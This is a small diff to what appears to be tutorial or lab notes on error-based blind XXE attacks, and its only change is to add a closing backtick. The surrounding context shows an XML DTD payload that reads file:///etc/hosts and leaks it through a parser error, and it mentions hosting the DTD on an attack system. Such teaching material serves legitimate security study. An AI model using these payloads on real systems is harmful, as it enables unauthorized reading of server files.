@@ -500,7 +500,7 @@ We may find ourselves in a situation where the web app doesn't write any output,
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
-- The above code creates an entity `file` for the file we want to read (`<!ENTITY % file SYSTEM "file:///etc/hosts">`), and then we create a nonsense entity that tries to join with our file entity (`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">), since the 2nd entity does not exist, it will throw an error, along with our file entity.
+- The above code creates an entity `file` for the file we want to read (`<!ENTITY % file SYSTEM "file:///etc/hosts">`), and then we create a nonsense entity that tries to join with our file entity (`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`), since the 2nd entity does not exist, it will throw an error, along with our file entity.
 - We can then that references our error entity hosted on our attack system.
 ```xml
 <!DOCTYPE email [ 
